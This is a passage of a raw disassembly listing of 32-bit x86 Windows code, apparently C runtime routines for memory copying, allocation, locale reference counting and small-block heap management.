  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
  42498d:	push   DWORD PTR [ebp+0xc]
  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
  425044:	jmp    0x425089
  425046:	push   0x4
  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
